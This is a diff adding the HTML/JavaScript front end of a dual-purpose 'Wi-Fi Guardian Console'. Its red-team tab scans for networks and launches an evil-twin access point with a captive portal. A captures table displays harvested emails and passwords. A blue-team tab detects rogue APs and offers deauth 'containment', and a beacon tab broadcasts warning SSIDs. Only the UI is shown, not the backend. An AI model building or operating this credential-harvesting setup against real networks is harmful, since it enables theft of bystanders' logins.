@@ -1,0 +1,263 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Wi-Fi Guardian Console</title>
+<style>
+  :root{
+    --bg:#0a0e14; --panel:#111823; --panel2:#0d141d; --line:#1e2a38;
+    --ink:#d7e3ee; --dim:#7f93a6; --cyan:#35d0d8; --green:#43d675;
+    --red:#ff5555; --amber:#d9a441; --mag:#c678dd;
+  }
+  *{ box-sizing:border-box; }
+  body{ margin:0; background:var(--bg); color:var(--ink);
+        font:14px/1.5 ui-monospace,"JetBrains Mono",Consolas,monospace; }
+  header{ display:flex; align-items:center; gap:14px; flex-wrap:wrap;
+          padding:12px 16px; border-bottom:1px solid var(--line); background:var(--panel2); }
+  header h1{ font-size:16px; margin:0; letter-spacing:.5px; }
+  header h1 .sh{ color:var(--cyan); }
+  .chips{ display:flex; gap:8px; flex-wrap:wrap; margin-left:auto; }
+  .chip{ font-size:11px; padding:3px 9px; border-radius:20px; border:1px solid var(--line);
+         color:var(--dim); background:#0b1118; white-space:nowrap; }
+  .chip.on{ color:var(--bg); background:var(--green); border-color:var(--green); font-weight:600; }
+  .chip.warn.on{ background:var(--amber); border-color:var(--amber); }
+  .chip.red.on{ background:var(--red); border-color:var(--red); }
+  .iface{ font-size:11px; color:var(--dim); }
+  nav{ display:flex; gap:4px; padding:10px 16px 0; border-bottom:1px solid var(--line); background:var(--panel2); }
+  nav button{ background:none; border:0; color:var(--dim); padding:9px 16px; cursor:pointer;
+              font:inherit; border-bottom:2px solid transparent; }
+  nav button.active{ color:var(--ink); border-bottom-color:var(--cyan); }
+  nav button.red.active{ border-bottom-color:var(--green); }
+  nav button.blue.active{ border-bottom-color:var(--cyan); }
+  nav button.beacon.active{ border-bottom-color:var(--amber); }
+  main{ padding:16px; max-width:1100px; margin:0 auto; }
+  .tab{ display:none; } .tab.show{ display:block; }
+  .card{ background:var(--panel); border:1px solid var(--line); border-radius:10px; padding:14px; margin-bottom:14px; }
+  .card h2{ font-size:13px; margin:0 0 10px; color:var(--dim); text-transform:uppercase; letter-spacing:1px; }
+  button.act{ background:#13202e; color:var(--ink); border:1px solid var(--line); border-radius:7px;
+              padding:8px 14px; cursor:pointer; font:inherit; }
+  button.act:hover{ border-color:var(--cyan); }
+  button.go{ background:var(--green); color:var(--bg); border-color:var(--green); font-weight:600; }
+  button.stop{ background:#2a1216; color:var(--red); border-color:#5a2730; }
+  table{ width:100%; border-collapse:collapse; font-size:13px; }
+  th,td{ text-align:left; padding:6px 8px; border-bottom:1px solid var(--line); }
+  th{ color:var(--dim); font-weight:500; }
+  .mini{ font-size:11px; color:var(--dim); }
+  .tgt{ color:var(--green); font-weight:600; }
+  .row{ display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
+  input[type=text],input[type=number]{ background:#0b1118; border:1px solid var(--line); color:var(--ink);
+       border-radius:6px; padding:7px 9px; font:inherit; }
+  .banner{ display:none; background:var(--red); color:#fff; font-weight:700; text-align:center;
+           padding:12px; border-radius:8px; margin-bottom:12px; letter-spacing:.5px; }
+  .banner.show{ display:block; animation:pulse 1s infinite; }
+  @keyframes pulse{ 50%{ opacity:.6; } }
+  .att{ padding:6px 0; border-bottom:1px solid var(--line); }
+  .att .sta{ color:var(--cyan); }
+  .att .dev{ color:#9fb3b3; font-size:.85em; } .att .dev.rand{ color:var(--amber); font-style:italic; }
+  .att .warn{ color:var(--red); font-weight:600; font-size:.8em; margin-right:6px; }
+  .rogue .ssid{ color:var(--red); font-weight:600; }
+  .pill{ display:inline-block; font-size:11px; padding:2px 8px; border-radius:12px; background:#13202e; color:var(--dim); }
+  #console{ background:#06090d; border:1px solid var(--line); border-radius:10px; padding:10px;
+            height:220px; overflow:auto; font-size:12px; white-space:pre-wrap; color:#9fb6c9; }
+  .empty{ color:var(--dim); font-style:italic; padding:8px 0; }
+  label.sw{ display:inline-flex; align-items:center; gap:8px; cursor:pointer; }
+</style>
+</head>
+<body>
+<header>
+  <h1>⚡ WI-FI <span class="sh">GUARDIAN</span> CONSOLE</h1>
+  <span class="iface" id="iface"></span>
+  <div class="chips">
+    <span class="chip" id="c-monitor">MONITOR</span>
+    <span class="chip" id="c-airbase">AIRBASE</span>
+    <span class="chip" id="c-portal">PORTAL</span>
+    <span class="chip" id="c-defense">DEFENSE</span>
+    <span class="chip warn" id="c-beacon">BEACON</span>
+    <span class="chip" id="c-captures">0 CAPTURES</span>
+  </div>
+</header>
+
+<nav>
+  <button class="red active" data-tab="red">🔴 RED TEAM</button>
+  <button class="blue" data-tab="blue">🔵 BLUE TEAM</button>
+  <button class="beacon" data-tab="beacon">📡 BEACON</button>
+  <button data-tab="captures">🎣 CAPTURES</button>
+</nav>
+
+<main>
+  <!-- RED -->
+  <section class="tab show" id="tab-red">
+    <div class="card">
+      <h2>recon</h2>
+      <div class="row">
+        <button class="act go" onclick="act('red_scan')">enable monitor &amp; scan</button>
+        <span class="mini" id="red-scanmsg"></span>
+      </div>
+      <table style="margin-top:10px"><thead><tr><th>CH</th><th>PWR</th><th>ENC</th><th>BSSID</th><th>SSID</th><th></th></tr></thead>
+        <tbody id="recon"><tr><td colspan="6" class="empty">no scan yet</td></tr></tbody></table>
+    </div>
+    <div class="card">
+      <h2>attack</h2>
+      <div class="row">
+        <span>target: <span class="tgt" id="tgt">— none —</span></span>
+        <button class="act go" onclick="act('red_launch')">launch evil twin</button>
+        <button class="act stop" onclick="act('red_stop')">stop all</button>
+      </div>
+      <div class="mini" style="margin-top:8px">Pick a target from recon, then launch. Authorized / own devices only.</div>
+    </div>
+  </section>
+
+  <!-- BLUE -->
+  <section class="tab" id="tab-blue">
+    <div class="banner" id="banner"></div>
+    <div class="card">
+      <h2>defense</h2>
+      <div class="row">
+        <button class="act go" id="blue-start" onclick="act('blue_start')">start defense</button>
+        <button class="act stop" id="blue-stop" onclick="act('blue_stop')">stop defense</button>
+        <label class="sw"><input type="checkbox" id="contain" onchange="toggleContain()"> active containment (deauth rogue links)</label>
+        <span class="pill" id="blue-known"></span>
+      </div>
+    </div>
+    <div class="card">
+      <h2>rogue APs blocklisted <span id="rogueN" class="mini"></span></h2>
+      <div id="rogues"><div class="empty">none detected</div></div>
+    </div>
+    <div class="card">
+      <h2>connection attempts <span id="attN" class="mini"></span></h2>
+      <div id="attempts"><div class="empty">no devices reaching for a rogue yet</div></div>
+    </div>
+  </section>
+
+  <!-- BEACON -->
+  <section class="tab" id="tab-beacon">
+    <div class="card">
+      <h2>warning beacon</h2>
+      <div class="mini" style="margin-bottom:10px">Broadcasts beacons whose SSID is a warning so nearby phones see it in their Wi-Fi list — the one app-less, number-less reach. ⚠ transmits; claims the radio (stop defense/attack first).</div>
+      <div class="row" style="margin-bottom:8px">
+        <input type="text" id="b-ssid1" size="30" value="DO-NOT-JOIN-FreeWiFi-is-FAKE">
+      </div>
+      <div class="row" style="margin-bottom:8px">
+        <input type="text" id="b-ssid2" size="30" value="WARNING-Evil-Twin-Nearby">
+      </div>
+      <div class="row">
+        <label class="mini">channel <input type="number" id="b-ch" min="1" max="14" value="6" style="width:60px"></label>
+        <button class="act go" onclick="startBeacon()">start beacon</button>
+        <button class="act stop" onclick="act('beacon_stop')">stop beacon</button>
+      </div>
+      <div class="mini" style="margin-top:8px">Each SSID max 32 bytes. Leave a field blank to skip it.</div>
+    </div>
+  </section>
+
+  <!-- CAPTURES -->
+  <section class="tab" id="tab-captures">
+    <div class="card">
+      <h2>captured submissions <span id="capN" class="mini"></span></h2>
+      <div class="row" style="margin-bottom:10px">
+        <button class="act" onclick="loadCaptures()">refresh</button>
+        <button class="act stop" onclick="wipeCaptures()">wipe</button>
+      </div>
+      <table><thead><tr><th>time</th><th>device</th><th>IP</th><th>email</th><th>password</th></tr></thead>
+        <tbody id="captures"><tr><td colspan="5" class="empty">no captures</td></tr></tbody></table>
+    </div>
+  </section>
+
+  <div class="card">
+    <h2>live console</h2>
+    <div id="console">starting…</div>
+  </div>
+</main>
+
+<script>
+const $ = id => document.getElementById(id);
+const esc = s => String(s==null?"":s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+let lastAtt = 0;
+
+// tabs
+document.querySelectorAll("nav button").forEach(b => b.onclick = () => {
+  document.querySelectorAll("nav button").forEach(x => x.classList.remove("active"));
+  document.querySelectorAll(".tab").forEach(x => x.classList.remove("show"));
+  b.classList.add("active"); $("tab-"+b.dataset.tab).classList.add("show");
+  if (b.dataset.tab === "captures") loadCaptures();
+});
+
+async function act(action, extra={}) {
+  await fetch("/api/action", {method:"POST", headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({action, ...extra})});
+  refresh();
+}
+function toggleContain(){ act("blue_toggle", {contain: $("contain").checked}); }
+function startBeacon(){
+  const ssids = [$("b-ssid1").value, $("b-ssid2").value].filter(s => s.trim());
+  act("beacon_start", {ssids, channel: parseInt($("b-ch").value)||6});
+}
+async function wipeCaptures(){ await fetch("/api/captures/wipe",{method:"POST"}); loadCaptures(); }
+
+function chip(id, on, cls){ const e=$(id); e.classList.toggle("on", !!on); if(cls) e.classList.toggle(cls, true); }
+
+async function refresh(){
+  let s;
+  try { s = await (await fetch("/api/status")).json(); } catch(e){ return; }
+  $("iface").textContent = "radio: " + esc(s.iface);
+  chip("c-monitor", s.red.monitor); chip("c-airbase", s.red.airbase);
+  chip("c-portal", s.red.portal); chip("c-defense", s.blue.running);
+  const bc=$("c-beacon"); bc.classList.toggle("on", s.beacon.running);
+  $("c-captures").textContent = (s.captures||0)+" CAPTURES";
+  $("c-captures").classList.toggle("on", (s.captures||0)>0);
+
+  // RED
+  $("tgt").textContent = s.red.target && s.red.target.ssid
+    ? `${s.red.target.ssid}  ch${s.red.target.channel} (${s.red.target.bssid})` : "— none —";
+  $("red-scanmsg").textContent = s.red.scanning ? "scanning…" : "";
+  $("recon").innerHTML = (s.targets && s.targets.length)
+    ? s.targets.map(t => `<tr><td>${esc(t.channel)}</td><td>${esc(t.power)}</td><td>${esc(t.enc)}</td>
+        <td class="mini">${esc(t.bssid)}</td><td>${esc(t.ssid)}</td>
+        <td><button class="act" onclick="act('red_select',{bssid:'${esc(t.bssid)}'})">🎯</button></td></tr>`).join("")
+    : `<tr><td colspan="6" class="empty">no scan yet</td></tr>`;
+
+  // BLUE
+  $("blue-known").textContent = s.blue.known ? `guarding ${s.blue.known} known networks` : "";
+  $("contain").checked = !!s.blue.contain;
+  const rg = s.blue.evil||[];
+  $("rogueN").textContent = rg.length ? `(${rg.length})` : "";
+  $("rogues").innerHTML = rg.length ? rg.map(e =>
+    `<div class="rogue"><span class="ssid">${esc(e.ssid)}</span>
+      <div class="mini">${esc(e.bssid)} · ch${esc(e.channel)} · ${esc((e.crypto||['OPEN']).join(','))} · ${esc(e.ts)}</div>
+      ${(e.reasons||[]).map(r=>`<div class="mini">↳ ${esc(r)}</div>`).join("")}</div>`).join("")
+    : `<div class="empty">none detected</div>`;
+  const at = s.blue.attempts||[];
+  $("attN").textContent = at.length ? `(${at.length})` : "";
+  $("attempts").innerHTML = at.length ? at.map(a =>
+    `<div class="att"><span class="warn">DO NOT CONNECT</span>
+      <span class="sta">${esc(a.sta)}</span>${a.device?` <span class="dev${a.randomized?' rand':''}">${esc(a.device)}</span>`:""}
+      → <span>${esc(a.ssid)}</span> <span class="mini">${esc(a.action)} · ${esc(a.ts)}</span></div>`).join("")
+    : `<div class="empty">no devices reaching for a rogue yet</div>`;
+  if (at.length && at.length !== lastAtt) {
+    const a = at[0];
+    $("banner").innerHTML = `⚠ Device ${esc(a.sta)}${a.device?` (${esc(a.device)})`:""} is reaching for the FAKE "${esc(a.ssid)}" — DO NOT CONNECT`;
+    $("banner").classList.add("show");
+    clearTimeout(window._bt); window._bt = setTimeout(()=>$("banner").classList.remove("show"), 8000);
+  }
+  lastAtt = at.length;
+}
+
+async function loadLogs(){
+  try { $("console").textContent = await (await fetch("/api/logs")).text() || "(quiet)"; $("console").scrollTop = 1e9; }
+  catch(e){}
+}
+async function loadCaptures(){
+  let rows=[]; try{ rows = await (await fetch("/api/captures")).json(); }catch(e){}
+  $("capN").textContent = rows.length ? `(${rows.length})` : "";
+  $("captures").innerHTML = rows.length ? rows.slice().reverse().map(c =>
+    `<tr><td class="mini">${esc(c.ts)}</td><td>${esc(c.hostname||'?')}</td><td class="mini">${esc(c.ip)}</td>
+      <td>${esc((c.fields||{}).email)}</td><td>${esc((c.fields||{}).password)}</td></tr>`).join("")
+    : `<tr><td colspan="5" class="empty">no captures</td></tr>`;
+}
+
+refresh(); loadLogs();
+setInterval(refresh, 2000);
+setInterval(loadLogs, 2000);
+</script>
+</body>
+</html>
